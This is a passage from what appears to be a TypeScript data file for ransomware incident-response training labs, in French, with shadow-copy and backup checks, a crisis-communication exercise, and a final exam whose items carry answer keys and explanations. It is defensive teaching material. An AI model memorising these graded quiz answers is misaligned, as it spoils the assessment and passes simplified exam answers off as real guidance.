          command: "vssadmin list shadows /for=D:",
          expectedOutput: "No items found (supprimées)"
        }
      ],
      exercises: [
        {
          id: "ex4-1",
          question: "Les shadow copies ont été...",
          type: "multiple-choice",
          options: ["Préservées", "Supprimées par le ransomware", "Jamais configurées", "Chiffrées"],
          correctAnswer: "Supprimées par le ransomware",
          explanation: "Les ransomwares modernes suppriment les shadow copies"
        },
        {
          id: "ex4-2",
          question: "Le backup le plus récent date de quand?",
          type: "text",
          correctAnswer: "02:00",
          hint: "Regardez LastBackup",
          explanation: "Backup à 02:00 = perte de ~12h de données"
        }
      ],
      tips: [
        "Testez TOUJOURS le backup avant de restore"
      ],
      checkpoint: "Impact: ~12,000 fichiers, backup de 12h dispo",
      estimatedTime: "15 min"
    },
    {
      id: 5,
      title: "Communication et Coordination",
      objective: "Gérer la communication de crise",
      theory: `## Communication Incident Ransomware

### Parties prenantes à notifier:
| Qui | Quand | Contenu |
|-----|-------|---------|
| Management | Immédiat | Situation, impact, plan |
| IT Ops | Immédiat | Actions techniques |
| Legal | < 1h | Implications légales |
| Autorités | Selon loi | Notification ANSSI si requis |

### Documentation requise:
- Timeline précise des événements
- Actions prises et par qui
- Décisions et justifications`,
      scenario: `Préparez le briefing pour le management.`,
      tasks: [
        "Rédiger le briefing management",
        "Préparer la timeline officielle",
        "Lister les décisions requises"
      ],
      commands: [
        {
          description: "Template briefing management",
          command: "# Executive Summary",
          expectedOutput: "Incident: Ransomware actif\\nImpact: 12000 fichiers\\nStatus: Contenu\\nRecovery: 2-3h"
        }
      ],
      exercises: [
        {
          id: "ex5-1",
          question: "Faut-il payer la rançon?",
          type: "multiple-choice",
          options: ["Oui, pour récupérer les données", "Non, si backups disponibles", "Toujours négocier d'abord", "Décision légale uniquement"],
          correctAnswer: "Non, si backups disponibles",
          explanation: "Avec des backups récents, le paiement n'est pas nécessaire"
        },
        {
          id: "ex5-2",
          question: "Qui décide de payer une rançon?",
          type: "multiple-choice",
          options: ["Le SOC", "Le CISO", "La direction générale + Legal", "L'assurance"],
          correctAnswer: "La direction générale + Legal",
          explanation: "Décision business et légale, pas technique"
        }
      ],
      tips: [
        "Documentez TOUT avec timestamps"
      ],
      checkpoint: "Briefing préparé, recovery en cours",
      estimatedTime: "10 min"
    }
  ],
  finalExam: [
    {
      id: "final-1",
      question: "La première action lors d'un ransomware actif est...",
      type: "multiple-choice",
      options: ["Tuer le processus", "Isoler du réseau", "Appeler le FBI", "Éteindre le serveur"],
      correctAnswer: "Isoler du réseau",
      explanation: "L'isolation empêche la propagation"
    },
    {
      id: "final-2",
      question: "Pourquoi ne pas éteindre un serveur infecté?",
      type: "multiple-choice",
      options: ["Corruption de données", "Perte des clés en mémoire", "Le ransomware résiste", "Prend trop de temps"],
      correctAnswer: "Perte des clés en mémoire",
      explanation: "Les clés de chiffrement peuvent être en RAM"
    },
    {
      id: "final-3",
      question: "svchostx.exe est...",
      type: "multiple-choice",
      options: ["Processus Windows légitime", "Typosquatting malveillant", "Service réseau", "Outil Microsoft"],
      correctAnswer: "Typosquatting malveillant",
      explanation: "svchost.exe (sans x) est légitime"
    },
    {
      id: "final-4",
      question: "Qui décide de payer une rançon?",
      type: "multiple-choice",
      options: ["SOC", "CISO", "Direction + Legal", "Assureur"],
      correctAnswer: "Direction + Legal",
      explanation: "C'est une décision business et légale"
    }
  ],
  passingScore: 85,
  certification: "Ransomware Response Specialist",
  tags: ["ransomware", "incident-response", "T1486", "recovery", "crisis-management"]
};

// ============================================
// Export all labs
// ============================================
export const allLabs: Lab[] = [
  labPhishing,
  labExecution,
  labCredentialAccess,
  labPersistence,
  labLateralMovement,
  labExfiltration,
  labC2Detection,
  labRansomware
];

export const getLabById = (id: string): Lab | undefined => {
  return allLabs.find(lab => lab.id === id);
};

export const getLabBySopId = (sopId: string): Lab | undefined => {
  return allLabs.find(lab => lab.sopId === sopId);
};

export const getLabsByDifficulty = (difficulty: string): Lab[] => {
  return allLabs.filter(lab => lab.difficulty === difficulty);
};

export const getLabsByCategory = (category: string): Lab[] => {
  return allLabs.filter(lab => lab.category === category);
};
